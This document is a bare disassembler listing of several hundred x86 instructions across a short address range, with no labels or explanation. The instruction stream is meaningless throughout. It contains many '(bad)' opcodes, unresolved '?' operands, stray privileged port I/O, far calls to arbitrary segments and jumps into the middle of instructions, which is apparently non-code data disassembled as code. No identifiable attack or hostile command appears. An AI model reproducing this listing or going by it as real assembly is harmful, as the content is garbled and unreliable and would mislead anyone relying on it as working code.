  41b93a:	mov    dl,0xd6
  41b93c:	mov    cl,0xb
  41b93e:	xchg   BYTE PTR [ecx],al
  41b940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b941:	pushf  
  41b942:	sbb    al,BYTE PTR [ebx+0x79]
  41b945:	push   ebp
  41b946:	lea    eax,[ebx-0x2a]
  41b949:	jns    0x41b956
  41b94b:	push   eax
  41b94c:	dec    esp
  41b94d:	call   0xdf85825e
  41b952:	sub    bh,BYTE PTR [esi-0x7490f4dc]
  41b958:	cmp    eax,DWORD PTR [esp+esi*2+0x5fae1315]
  41b95f:	sub    edi,DWORD PTR [eax-0x14]
  41b962:	lods   eax,DWORD PTR ds:[esi]
  41b963:	mov    ah,0xbf
  41b965:	lahf   
  41b966:	mov    esp,0x8d543c7
  41b96b:	int    0xfd
  41b96d:	arpl   WORD PTR [edi-0x4c9ba66d],si
  41b973:	pop    ebp
  41b974:	sbb    ah,ch
  41b976:	ds or  ecx,esp
  41b979:	jg     0x41b913
  41b97b:	int    0x3c
  41b97d:	cmp    ecx,ebp
  41b97f:	daa    
  41b980:	cmp    BYTE PTR [ebx+0x564509d6],al
  41b986:	(bad)  
  41b988:	popf   
  41b989:	inc    esp
  41b98a:	jle    0x41b96a
  41b98c:	shl    DWORD PTR [eax-0x3ae574d4],1
  41b992:	mov    edi,?
  41b994:	call   0xd9bb:0x78aa7c6
  41b99b:	ins    BYTE PTR es:[edi],dx
  41b99c:	cwde   
  41b99d:	in     al,dx
  41b99e:	mov    dl,0x3f
  41b9a0:	inc    DWORD PTR [eax-0x7095eee9]
  41b9a6:	ret    0x5880
  41b9a9:	jg     0x41b95f
  41b9ab:	pop    ebx
  41b9ac:	sar    BYTE PTR [edx+ecx*8+0x6e],1
  41b9b0:	or     eax,0x45946e19
  41b9b5:	test   BYTE PTR [eax],dh
  41b9b7:	jmp    0x41b9f7
  41b9b9:	lea    ecx,[ecx-0x57]
  41b9bc:	push   eax
  41b9bd:	nop
  41b9be:	xor    BYTE PTR fs:[edi],dh
  41b9c1:	into   
  41b9c2:	jg     0x41b95a
  41b9c4:	xchg   ecx,eax
  41b9c5:	jnp    0x41b986
  41b9c7:	mov    dl,ah
  41b9c9:	out    0x40,al
  41b9cb:	dec    edi
  41b9cc:	sub    al,0x9f
  41b9ce:	fild   QWORD PTR [eax-0x20]
  41b9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9d2:	xchg   edi,eax
  41b9d3:	addr16 mov ebp,0x8a0d0945
  41b9d9:	test   BYTE PTR [ecx],dl
  41b9db:	pop    ss
  41b9dc:	stos   DWORD PTR es:[edi],eax
  41b9dd:	imul   esi,DWORD PTR [edi],0x929ecca6
  41b9e3:	aam    0x6a
  41b9e5:	mov    cl,0xc9
  41b9e7:	test   al,0x33
  41b9e9:	inc    edx
  41b9ea:	sub    DWORD PTR [esi+ebx*8],ebp
  41b9ed:	inc    esi
  41b9ee:	push   ebp
  41b9ef:	stc    
  41b9f0:	cmp    bl,BYTE PTR [edx+edi*4+0x27fe18d5]
  41b9f7:	sti    
  41b9f8:	pop    edi
  41b9f9:	int3   
  41b9fa:	add    ecx,DWORD PTR [ebx+0x4a63116]
  41ba00:	scas   eax,DWORD PTR es:[edi]
  41ba01:	push   eax
  41ba02:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41ba04:	add    bl,dh
  41ba06:	and    ch,BYTE PTR [eax+0x14fb94d4]
  41ba0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba0d:	test   eax,0xad681c84
  41ba12:	rol    DWORD PTR [edi-0x15f315f3],cl
  41ba18:	mov    DWORD PTR ds:0x23c9ecb7,ecx
  41ba1e:	add    DWORD PTR [ecx],0x4c5686b5
  41ba24:	sbb    edi,DWORD PTR ds:0x8409f949
  41ba2a:	(bad)  
  41ba2b:	push   edi
  41ba2c:	mov    ebx,DWORD PTR [edx]
  41ba2e:	pop    esi
  41ba2f:	adc    BYTE PTR [esi],al
  41ba31:	pop    eax
  41ba32:	or     bl,BYTE PTR [ecx]
  41ba34:	xor    DWORD PTR [ebx-0x57092377],edi
  41ba3a:	jmp    0x41ba22
  41ba3c:	adc    DWORD PTR gs:[edx],edx
  41ba3f:	mov    dl,0x68
  41ba41:	mov    ebp,?
  41ba43:	sub    ah,BYTE PTR [ebx+eax*2]
  41ba46:	loop   0x41ba49
  41ba48:	push   es
  41ba49:	adc    BYTE PTR [eax+0x11433daf],0xea
  41ba50:	std    
  41ba51:	cmp    BYTE PTR [ecx],0xda
  41ba54:	jmp    0x87886b63
  41ba59:	pop    edx
  41ba5a:	fsub   QWORD PTR [edi-0x28220917]
  41ba60:	jg     0x41ba47
  41ba62:	lock inc esp
  41ba64:	mov    dh,0x60
  41ba66:	inc    ebp
  41ba67:	mov    esi,0xb0949afd
  41ba6c:	xor    DWORD PTR ds:0x726d2a36,0x1a57a761
  41ba76:	dec    ecx
  41ba77:	push   es
  41ba78:	cmc    
  41ba79:	cmp    ecx,DWORD PTR [ebx+0x1701e52]
  41ba7f:	mov    BYTE PTR [edx+0x2d],dh
  41ba82:	lahf   
  41ba83:	dec    eax
  41ba84:	pushf  
  41ba85:	xchg   esi,eax
  41ba86:	push   esi
  41ba87:	xor    eax,0xfa12dc43
  41ba8c:	cld    
  41ba8d:	mov    fs:0x55367bb6,eax
  41ba93:	es stc 
  41ba95:	sbb    eax,0x7015fc29
  41ba9a:	xlat   BYTE PTR ds:[ebx]
  41ba9b:	lds    ebx,FWORD PTR [ecx]
  41ba9d:	retf   0xf558
  41baa0:	push   0xffffffd9
  41baa2:	hlt    
  41baa3:	or     eax,0xf6cc8074
  41baa8:	or     eax,0xa5c83b46
  41baad:	mov    eax,0xbf2a8c02
  41bab2:	stc    
  41bab3:	sub    eax,0xc1bcfa4a
  41bab8:	outs   dx,BYTE PTR ds:[esi]
  41bab9:	cdq    
  41baba:	bound  esp,QWORD PTR [eax]
  41babc:	aaa    
  41babd:	fwait
  41babe:	lock jle 0x41bafa
  41bac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bac2:	cwde   
  41bac3:	add    bh,BYTE PTR [edi-0xc214017]
  41bac9:	and    BYTE PTR [ecx+0xeae4d99],0x2f
  41bad0:	call   0x1f32:0xd78e0f69
  41bad7:	test   BYTE PTR [eax+ebp*2],cl
  41bada:	or     DWORD PTR [esp+ebx*2+0x491624c6],0xa61d440a
  41bae5:	and    DWORD PTR [ebp-0x5029aeea],esi
  41baeb:	jb     0x41bab2
  41baed:	jne    0x41bb0d
  41baef:	mov    edi,0x93935494
  41baf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baf5:	aad    0xa3
  41baf7:	das    
  41baf8:	pop    eax
  41baf9:	cs pusha 
  41bafb:	inc    ebp
  41bafc:	clc    
  41bafd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bafe:	sti    
  41baff:	push   ds
  41bb00:	mov    BYTE PTR [ecx+0x556e2191],cl
  41bb06:	(bad)  
  41bb07:	jb     0x41bb44
  41bb09:	pop    edx
  41bb0a:	xor    bl,bl
  41bb0c:	pushf  
  41bb0d:	imul   ebp,DWORD PTR [edi],0x36
  41bb10:	and    eax,0xadb5a767
  41bb15:	mov    cl,0x4e
  41bb17:	mov    DWORD PTR [esi-0x10],edi
  41bb1a:	loope  0x41bb3a
  41bb1c:	lds    esp,FWORD PTR [edx-0x48]
  41bb1f:	dec    edx
  41bb20:	sub    al,BYTE PTR [eax+0x1f]
  41bb23:	data16 sub BYTE PTR [esi-0x3b7f0636],dh
  41bb2a:	mov    edx,ebx
  41bb2c:	pop    ebp
  41bb2d:	call   0x3bd1:0xcb057007
  41bb34:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb36:	hlt    
  41bb37:	or     ebp,DWORD PTR [ebp+esi*8+0x6c]
  41bb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb3c:	ins    DWORD PTR es:[edi],dx
  41bb3d:	add    eax,0x4cf2e87
  41bb42:	(bad)  
  41bb43:	fisttp QWORD PTR [edx+0x24]
  41bb46:	lds    edx,FWORD PTR [edi+0x68]
  41bb49:	jge    0x41bb11
  41bb4b:	mov    esp,0x537134e
  41bb50:	sbb    al,0xdb
  41bb52:	(bad)  
  41bb53:	cmp    eax,0x960fd31c
  41bb58:	outs   dx,DWORD PTR ds:[esi]
  41bb59:	loope  0x41bbb2
  41bb5b:	xchg   ecx,eax
  41bb5c:	aaa    
  41bb5d:	js     0x41bb4d
  41bb5f:	jp     0x41bbac
  41bb61:	ds xchg edi,eax
  41bb63:	(bad)  
  41bb64:	fstp   QWORD PTR [esi-0x4e09c4a1]
  41bb6a:	pop    ebx
  41bb6b:	push   esi
  41bb6c:	mov    bl,0xd
  41bb6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb6f:	(bad)  
  41bb70:	in     eax,0x45
  41bb72:	pusha  
  41bb73:	daa    
  41bb74:	pushf  
  41bb75:	lahf   
  41bb76:	and    BYTE PTR [esi],0x82
  41bb79:	mov    ?,WORD PTR [ebx]
  41bb7b:	(bad)  
  41bb7c:	sbb    al,0xf3
  41bb7e:	sbb    ebx,edx
  41bb80:	ud1    edi,DWORD PTR [edi]
  41bb83:	lock scas al,BYTE PTR es:[edi]
  41bb85:	iret   
  41bb86:	test   BYTE PTR [ebp+0x4],0x18
  41bb8a:	loop   0x41bb96
  41bb8c:	jae    0x41bbce
  41bb8e:	rcr    BYTE PTR ds:0xf0507d62,1
  41bb94:	xor    eax,0xf5523142
  41bb99:	loopne 0x41bc08
  41bb9b:	mov    ebx,0xb3d105a4
  41bba0:	outs   dx,BYTE PTR ds:[esi]
  41bba1:	out    0x8a,al
  41bba3:	xor    esi,DWORD PTR [eax-0x198ce3e]
  41bba9:	repnz push 0xffffff9a
  41bbac:	jg     0x41bc24
  41bbae:	push   ds
  41bbaf:	pop    esp
  41bbb0:	out    dx,eax
  41bbb1:	jae    0x41bc27
  41bbb3:	cmp    BYTE PTR [edx+edx*1-0x3a7b9952],dh
  41bbba:	and    BYTE PTR [esi+edx*4],0x9a
  41bbbe:	out    dx,al
  41bbbf:	out    0x5e,al
  41bbc1:	repz jl 0x41bbd6
  41bbc4:	add    eax,0xae7a8ab5
  41bbc9:	add    ebx,ebx
  41bbcb:	cli    
  41bbcc:	in     al,0x9f
  41bbce:	mov    ecx,0x6c1f7444
  41bbd3:	pop    ecx
  41bbd4:	mov    BYTE PTR [esi-0x6e],cl
  41bbd7:	mov    dl,0xe2
  41bbd9:	push   ecx
  41bbda:	hlt    
  41bbdb:	sub    al,0xa1
  41bbdd:	retf   
  41bbde:	fisubr DWORD PTR [edi-0x3a]
  41bbe1:	call   0xe999:0xa2bf024e
  41bbe8:	fsubr  QWORD PTR [esi-0x7f7d1e7]
  41bbee:	jnp    0x41bbda
  41bbf0:	mov    al,0xcb
  41bbf2:	lds    eax,FWORD PTR [eax]
  41bbf4:	leave  
  41bbf5:	inc    edi
  41bbf6:	sbb    DWORD PTR [edx+0x36],ecx
  41bbf9:	fwait
  41bbfa:	arpl   bp,sp
  41bbfc:	jp     0x9c29ce55
  41bc02:	imul   ecx
  41bc04:	jle    0x41bc32
  41bc06:	xor    eax,0x16e6bcd7
  41bc0b:	jmp    0x41bc19
  41bc0d:	shl    DWORD PTR [eax-0x24fbeef4],cl
  41bc13:	in     eax,dx
  41bc14:	mov    BYTE PTR [ebx-0x5d],bl
  41bc17:	aas    
  41bc18:	test   eax,0xe66aecfe
  41bc1d:	addr16 dec eax
  41bc1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc20:	mov    WORD PTR [ebp-0x68],ds
  41bc23:	xor    DWORD PTR [ebx],edi
  41bc25:	mov    esi,0xb995f725
  41bc2a:	add    al,ch
  41bc2c:	mov    esp,0x3330296a
  41bc31:	rol    BYTE PTR [ebp+esi*2-0x50],0x1b
  41bc36:	jle    0x41bc46
  41bc38:	in     eax,dx
  41bc39:	out    0xd3,eax
  41bc3b:	jg     0x41bbcd
  41bc3d:	outs   dx,DWORD PTR ds:[esi]
  41bc3e:	sbb    DWORD PTR [edi+0x57],ebp
  41bc41:	bound  ebx,QWORD PTR [edi]
  41bc43:	mov    al,0x17
  41bc45:	sub    BYTE PTR [esi-0x33],dl
  41bc48:	xchg   edx,eax
  41bc49:	(bad)  
  41bc4a:	jmp    0x5c7fff2c
  41bc4f:	push   0xffffff9c
  41bc51:	cwde   
  41bc52:	jge    0x41bbe0
  41bc54:	mov    ah,dh
  41bc56:	test   DWORD PTR [edx+edi*4-0x35baaf2d],ecx
  41bc5d:	jno    0x41bca5
  41bc5f:	popa   
  41bc60:	cli    
  41bc61:	mov    edx,esp
  41bc63:	push   ss
  41bc64:	sahf   
  41bc65:	mov    BYTE PTR [ecx+0x797035b2],dh
  41bc6b:	mov    dl,0x51
  41bc6d:	mov    bh,0xc4
  41bc6f:	(bad)  
  41bc70:	jmp    edi
  41bc72:	rcl    BYTE PTR [edx+ecx*1-0x7ff74b92],1
  41bc79:	fst    DWORD PTR [eax]
  41bc7b:	adc    ah,al
  41bc7d:	adc    eax,0xd57fb5a9
  41bc82:	mov    dl,0x69
  41bc84:	sub    eax,0x7c344341
  41bc89:	scas   al,BYTE PTR es:[edi]
  41bc8a:	(bad)  
  41bc8b:	int    0xbb
  41bc8d:	dec    ebp
  41bc8e:	imul   ebx,DWORD PTR [ecx-0x1ca1452e],0x51
  41bc95:	mov    eax,ds:0x143e2d57
  41bc9a:	neg    DWORD PTR [edi]
  41bc9c:	fs pop edi
  41bc9e:	or     DWORD PTR [ebx+eiz*8+0x79],0x57c34514
  41bca6:	arpl   WORD PTR [ebp-0x3d9aa321],di
  41bcac:	sbb    eax,0xb84e8139
  41bcb1:	sub    eax,esp
  41bcb3:	dec    esi
  41bcb4:	ins    DWORD PTR es:[edi],dx
  41bcb5:	call   0x3218:0xabd47359
  41bcbc:	cli    
  41bcbd:	imul   DWORD PTR [ebp-0x5f948312]
  41bcc3:	pushf  
  41bcc4:	xlat   BYTE PTR ds:[ebx]
  41bcc5:	xchg   edx,eax
  41bcc6:	mov    ah,0xd5
  41bcc8:	fidiv  WORD PTR ds:0x3025eb2f
  41bcce:	pushf  
  41bccf:	add    dl,dl
  41bcd1:	repnz mov ebx,0x413f82ec
  41bcd7:	sar    DWORD PTR [edi-0x1781c538],cl
  41bcdd:	aad    0x87
  41bcdf:	enter  0xffe4,0xd4
  41bce3:	push   ebp
  41bce4:	dec    edx
  41bce5:	jmp    0x41bd42
  41bce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bce8:	int3   
  41bce9:	xchg   BYTE PTR [esp+edx*2-0x4],dl
  41bced:	neg    DWORD PTR [ebp+ebx*1-0x64f0675c]
  41bcf4:	jp     0x41bd12
  41bcf6:	xor    ch,ah
  41bcf8:	sbb    bl,BYTE PTR [ebp+0xe6fd7d9]
  41bcfe:	cmp    BYTE PTR [esi+esi*8-0x44],bl
  41bd02:	and    BYTE PTR [ecx+eax*8+0x0],cl
  41bd06:	or     edx,DWORD PTR [ebx-0x791135a5]
  41bd0c:	inc    ebp
  41bd0d:	sbb    DWORD PTR [eax],0xe858bb7f
  41bd13:	dec    esp
  41bd14:	jecxz  0x41bc97
  41bd16:	dec    ebp
  41bd17:	ret    
  41bd18:	mov    eax,ds:0x344f3083
  41bd1d:	xor    eax,0x48d61601
  41bd22:	push   ss
  41bd23:	test   BYTE PTR [ebp+0x10c0c686],bl
  41bd29:	popa   
  41bd2a:	icebp  
  41bd2b:	outs   dx,DWORD PTR ds:[esi]
  41bd2c:	fist   WORD PTR [ebx-0x55]
  41bd2f:	adc    eax,0x3da91f7e
  41bd34:	inc    edx
  41bd35:	jne    0x41bcde
  41bd37:	fcmovnb st,st(4)
  41bd39:	sbb    dl,BYTE PTR [eax-0x62]
  41bd3c:	xor    al,0x92
  41bd3e:	jl     0x41bd95
  41bd40:	out    dx,eax
  41bd41:	sub    DWORD PTR [ecx],eax
  41bd43:	gs stc 
  41bd45:	mov    ch,0xff
  41bd47:	pop    es
  41bd48:	adc    ebp,edx
  41bd4a:	arpl   WORD PTR [ebp+0x45],bx
  41bd4d:	stos   DWORD PTR es:[edi],eax
  41bd4e:	lahf   
  41bd4f:	out    dx,eax
  41bd50:	pop    edi
  41bd51:	stos   BYTE PTR es:[edi],al
  41bd52:	xor    eax,edi
  41bd54:	leave  
  41bd55:	sub    edx,DWORD PTR [edx]
  41bd57:	jns    0x41bd5f
  41bd59:	adc    DWORD PTR [edi+edx*1],ebx
  41bd5c:	rol    BYTE PTR [edi+0x773fcb6d],0x23
  41bd63:	xchg   esp,eax
  41bd64:	dec    esi
  41bd65:	or     bh,BYTE PTR ds:0x4695c503
  41bd6b:	enter  0xf3f7,0x80
  41bd6f:	test   eax,0xfa749d3d
  41bd74:	fsubr  st,st(6)
  41bd76:	test   eax,0x61d3079e
  41bd7b:	dec    edx
  41bd7c:	(bad)  
  41bd7d:	dec    eax
  41bd7e:	jmp    0x5662:0xd74368c2
  41bd85:	or     al,0x49
  41bd87:	push   ecx
  41bd88:	pop    esi
  41bd89:	jbe    0x41bd55
  41bd8b:	sub    ebx,ebx
  41bd8d:	xor    edx,DWORD PTR [ecx-0x4e]
  41bd90:	fs mov esi,0x12ca81f1
  41bd96:	es std 
  41bd98:	ins    BYTE PTR es:[edi],dx
  41bd99:	icebp  
  41bd9a:	mov    bl,0x8b
  41bd9c:	jmp    0x41be09
  41bd9e:	inc    edi
  41bd9f:	and    cl,BYTE PTR [eax+0xee34a23]
  41bda5:	rcr    esi,0xbb
  41bda8:	aam    0xaf
  41bdaa:	ds dec ecx
  41bdac:	push   esp
  41bdad:	jae    0x41bdbe
  41bdaf:	push   0x2c
  41bdb1:	test   DWORD PTR [edx],0x274fcd0d
  41bdb7:	sahf   
  41bdb8:	leave  
  41bdb9:	mov    ebx,0xe825d8f3
  41bdbe:	add    eax,0x74fa7c5d
  41bdc3:	pop    esi
  41bdc4:	cwde   
  41bdc5:	sti    
  41bdc6:	inc    ecx
  41bdc7:	(bad)  
  41bdc8:	and    bh,ch
  41bdca:	or     ecx,DWORD PTR [ecx]
  41bdcc:	push   ebp
  41bdcd:	xor    al,0x71
  41bdcf:	gs dec edx
  41bdd1:	mov    bh,0x5
  41bdd3:	xor    al,0xbf
  41bdd5:	pop    eax
  41bdd6:	clc    
  41bdd7:	sbb    DWORD PTR [ebp+0x6b],esi
  41bdda:	popf   
  41bddb:	ins    DWORD PTR es:[edi],dx
  41bddc:	cmp    al,0x5a
  41bdde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bddf:	cmp    DWORD PTR [edx-0x349ba5c2],edi
  41bde5:	ret    0x5dbf
  41bde8:	dec    ecx
  41bde9:	test   BYTE PTR es:[edi-0x57775561],cl
  41bdf0:	dec    edi
  41bdf1:	fdivr  QWORD PTR [edi-0x4e]
  41bdf4:	lods   eax,DWORD PTR ds:[esi]
  41bdf5:	dec    edi
  41bdf6:	hlt    
  41bdf7:	loope  0x41be28
  41bdf9:	sar    DWORD PTR [esi],1
  41bdfb:	add    al,0xae
  41bdfd:	push   edi
  41bdfe:	cld    
  41bdff:	leave  
  41be00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be01:	or     ebp,DWORD PTR [ecx+0x34c43576]
  41be07:	test   al,0x2
  41be09:	ja     0x41bd8e
  41be0b:	repnz and eax,DWORD PTR [ebp-0x77e2de2f]
  41be12:	dec    ebx
  41be13:	jo     0x41bdd0
  41be15:	sub    DWORD PTR [ebx+0x25],ebx
  41be18:	addr16 pop ebx
  41be1a:	sbb    BYTE PTR [eax+0x2bfd5c99],ch
  41be20:	adc    dh,ch
  41be22:	pop    ebx
  41be23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be24:	mov    ecx,0x7057eff
  41be29:	sub    esp,0x853dd3fa
  41be2f:	mov    WORD PTR [edx-0x39],ds
  41be32:	sbb    ecx,DWORD PTR [esi+0x27cbc978]
  41be38:	fdivr  st,st(4)
  41be3a:	pop    ds
  41be3b:	fistp  DWORD PTR [ecx+0xe]
  41be3e:	cwde   
  41be3f:	jo     0x41be52
  41be41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be42:	add    DWORD PTR [eax],ebp
  41be44:	or     eax,0xd2649627
  41be49:	loopne 0x41be12
  41be4b:	shl    eax,cl
  41be4d:	add    esp,0xb
  41be50:	ds mov ch,0x1e
  41be53:	add    bh,BYTE PTR [ebp+0x1e]
  41be56:	xor    ebx,DWORD PTR [esi]
  41be58:	push   ds
  41be59:	call   0x802cfbe6
  41be5e:	and    bh,bl
  41be60:	pop    ds
  41be61:	cmc    
  41be62:	push   ecx
  41be63:	dec    esp
  41be64:	sbb    bl,0x96
  41be67:	pop    es
  41be68:	sbb    esi,edi
  41be6a:	js     0x41be08
  41be6c:	xor    dl,BYTE PTR ds:0x5eb8a58
  41be72:	das    
  41be73:	dec    eax
  41be74:	jns    0x41beb0
  41be76:	push   0xffffffa3
  41be78:	fld    QWORD PTR [edx+0x4]
  41be7b:	les    edx,FWORD PTR gs:[edi-0x5f1c4633]
  41be82:	pushf  
  41be83:	xchg   edi,eax
  41be84:	shl    DWORD PTR [edi-0x4e90c12d],cl
  41be8a:	in     al,dx
  41be8b:	and    ah,dl
  41be8d:	add    ch,al
  41be8f:	mov    esi,0xad1865a5
  41be94:	jns    0x41be74
  41be96:	in     al,0xd0
  41be98:	xchg   esp,eax
  41be99:	(bad)  
  41be9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be9b:	dec    ebx
  41be9c:	cli    
  41be9d:	sub    WORD PTR [edx+0x4b],cx
  41bea1:	in     al,dx
  41bea2:	dec    edi
  41bea3:	clc    
  41bea4:	ins    BYTE PTR es:[edi],dx
  41bea5:	sbb    al,0x95
  41bea7:	lds    ebx,FWORD PTR [ebx]
  41bea9:	popf   
  41beaa:	pop    eax
  41beab:	add    eax,0x8548d0c1
  41beb0:	(bad)  
  41beb2:	or     al,0xa5
  41beb4:	push   esp
  41beb5:	or     DWORD PTR [eax+0x24],edi
  41beb8:	leave  
  41beb9:	inc    esp
  41beba:	or     eax,0xfaba7bf7
  41bebf:	add    BYTE PTR [ebp-0x64],0xeb
  41bec3:	in     eax,0x4e
  41bec5:	stc    
  41bec6:	pop    eax
  41bec7:	xor    BYTE PTR gs:[esi],0x64
  41becb:	dec    esp
  41becc:	xchg   ecx,eax
  41becd:	inc    ebx
  41bece:	sub    DWORD PTR [eax+0x10],esp
  41bed1:	cs pusha 
  41bed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bed4:	mov    ch,0x50
  41bed6:	push   esi
  41bed7:	retf   
  41bed8:	xor    esp,DWORD PTR [edi+edi*2-0x45]
  41bedc:	outs   dx,DWORD PTR ds:[esi]
  41bedd:	into   
  41bede:	ss xchg esp,eax
  41bee0:	xor    al,0xdc
  41bee2:	ss push es
  41bee4:	dec    eax
  41bee5:	(bad)  
  41bee6:	adc    edx,DWORD PTR [bx+si-0xb]
  41beea:	jae    0x41becf
  41beec:	shr    BYTE PTR [edi],cl
  41beee:	test   BYTE PTR [ebx-0x63d363be],ch
  41bef4:	jle    0x41bf67
  41bef6:	and    al,0x45
  41bef8:	stos   BYTE PTR es:[edi],al
  41bef9:	bound  ebp,QWORD PTR [ecx+0x69]
  41befc:	(bad)  
  41befd:	mov    DWORD PTR [ecx+0x5ea4da76],esp
  41bf03:	jb     0x41bf66
  41bf05:	push   ebx
  41bf06:	imul   edx,DWORD PTR [ebx],0x5553fdfe
  41bf0c:	and    DWORD PTR [eax],0xaa23f966
  41bf12:	inc    sp
  41bf14:	leave  
  41bf15:	mov    cl,0x96
  41bf17:	scas   al,BYTE PTR es:[edi]
  41bf18:	push   es
  41bf19:	fimul  DWORD PTR [ecx-0x6a]
  41bf1c:	dec    ebp
  41bf1d:	outs   dx,DWORD PTR ds:[esi]
  41bf1e:	xor    eax,0x143fde0
  41bf23:	jp     0x41bed5
  41bf25:	shl    BYTE PTR [edi],0xdd
  41bf28:	jge    0x41bf3b
  41bf2a:	xchg   edx,eax
  41bf2b:	inc    ebx
  41bf2c:	push   edx
  41bf2d:	xor    al,0xda
  41bf2f:	rol    BYTE PTR [edi+0x52],cl
  41bf32:	push   ds
  41bf33:	add    BYTE PTR [edx],bl
  41bf35:	or     DWORD PTR [ebx],esi
  41bf37:	xchg   esi,eax
  41bf38:	pop    es
  41bf39:	add    ah,BYTE PTR [eax-0x22574444]
  41bf3f:	mov    al,0xf5
  41bf41:	and    al,0xf2
  41bf43:	xor    al,0xc9
  41bf45:	inc    edx
  41bf46:	call   0xed0471de
  41bf4b:	add    eax,0xcdd96f43
  41bf50:	shl    BYTE PTR [eax-0x4f93cbf3],cl
  41bf56:	lahf   
  41bf57:	js     0x41bfb5
  41bf59:	and    BYTE PTR [edi+edx*4+0x6ecb3e],dh
  41bf60:	aad    0x32
  41bf62:	test   ebx,0x444cc69e
  41bf68:	mov    DWORD PTR [esp+ebx*8],esp
  41bf6b:	xchg   BYTE PTR [edi],al
  41bf6d:	pop    ebx
  41bf6e:	dec    ebp
  41bf6f:	cld    
  41bf70:	lahf   
  41bf71:	sub    al,0xbc
  41bf73:	push   ds
  41bf74:	add    esi,DWORD PTR [edi]
  41bf76:	bnd jmp 0xd1f77ead
  41bf7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf7d:	mov    ds:0x94d0ed08,eax
  41bf82:	mov    ch,0x3b
  41bf84:	adc    dh,ah
  41bf86:	lea    esp,[ecx-0x2e11ae09]
  41bf8c:	(bad)  
  41bf8d:	lods   al,BYTE PTR ds:[esi]
  41bf8e:	sub    DWORD PTR [edx+0x2295f9f0],0xfffffff4
  41bf95:	loop   0x41bf33
  41bf97:	push   cs
  41bf98:	fiadd  WORD PTR cs:[edx]
  41bf9b:	pop    ds
  41bf9c:	test   DWORD PTR [ebp-0x6f15d073],ecx
  41bfa2:	retf   0x7eda
  41bfa5:	fnsave [esi]
  41bfa7:	add    al,0x78
  41bfa9:	xor    BYTE PTR [edi],bh
  41bfab:	sahf   
  41bfac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfad:	fsub   DWORD PTR [ecx+0x314b20f9]
  41bfb3:	jns    0x41bf80
  41bfb5:	kunpckbw k3,k2,k3
  41bfba:	popa   
  41bfbb:	mov    es,WORD PTR [ecx+0x7b]
  41bfbe:	test   DWORD PTR [ebx],eax
  41bfc0:	cs test esp,ecx
  41bfc3:	repz pop ebx
  41bfc5:	cmp    DWORD PTR [ebx-0x1e],ebp
  41bfc8:	(bad)  
  41bfc9:	cmp    al,0xe4
  41bfcb:	pop    eax
  41bfcc:	aad    0xae
  41bfce:	mov    dl,0x4d
  41bfd0:	jo     0x41bf76
  41bfd2:	rcl    BYTE PTR [edi-0x5a],cl
  41bfd5:	xchg   ebx,eax
  41bfd6:	fcomp  DWORD PTR [eax-0x589defda]
  41bfdc:	lahf   
  41bfdd:	inc    ebx
  41bfde:	jp     0x41bf7d
  41bfe0:	jmp    0x41bfa9
  41bfe2:	div    BYTE PTR [esi+0x52]
  41bfe5:	jl     0x41c04b
  41bfe7:	jmp    0x41c019
  41bfe9:	loope  0x41c05f
  41bfeb:	sbb    DWORD PTR [edi-0x1d0eb0e7],ecx
  41bff1:	sub    DWORD PTR [ebx],0x25
  41bff4:	xor    ebp,DWORD PTR [edi]
  41bff6:	stos   BYTE PTR es:[edi],al
  41bff7:	rol    DWORD PTR [eax],1
  41bff9:	jp     0x41bfd2
  41bffb:	sar    BYTE PTR [ebx],1
  41bffd:	xchg   edx,eax
  41bffe:	imul   ebp,DWORD PTR [ecx],0x47
  41c001:	cmc    
  41c002:	xchg   DWORD PTR [ebx-0x7a],edi
  41c005:	mov    ebx,0x8f5e6224
  41c00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c00b:	or     bl,BYTE PTR [ebx]
  41c00d:	push   esp
  41c00e:	push   cs
  41c00f:	xor    DWORD PTR [edx+ebx*1+0x2800641e],0x2e266420
  41c01a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c01b:	sbb    bh,BYTE PTR [edx+eiz*8]
  41c01e:	es adc al,0xd4
  41c021:	and    DWORD PTR [edx+0x11767165],ecx
  41c027:	clc    
  41c028:	sbb    eax,0xb4b3fc9a
  41c02d:	icebp  
  41c02e:	test   al,0xfd
  41c030:	jmp    0x41bfd6
  41c032:	push   0xffffffc7
  41c034:	fld    TBYTE PTR [ebx]
  41c036:	mov    DWORD PTR [edx+0xb],ebp
  41c039:	test   al,0x50
  41c03b:	xchg   ecx,eax
  41c03c:	(bad)  
  41c03d:	in     eax,0x29
  41c03f:	repz and esp,esi
  41c042:	aas    
  41c043:	call   0x31ac:0x36a2c32a
  41c04a:	sti    
  41c04b:	fmul   st,st(7)
  41c04d:	outs   dx,DWORD PTR ds:[esi]
  41c04e:	sbb    BYTE PTR [ecx+0x53],bh
  41c051:	push   esp
  41c052:	mov    al,ds:0xc2847df8
  41c057:	stos   DWORD PTR es:[edi],eax
  41c058:	(bad)  
  41c059:	xchg   esp,eax
  41c05a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c05b:	call   0x5d26:0x5b29ca4a
  41c062:	popa   
  41c063:	loope  0x41c0b7
  41c065:	mov    cl,0xef
  41c067:	jo     0x41c0ad
  41c069:	add    al,0xd3
  41c06b:	pop    eax
  41c06c:	imul   edi,ecx,0x858d4ed8
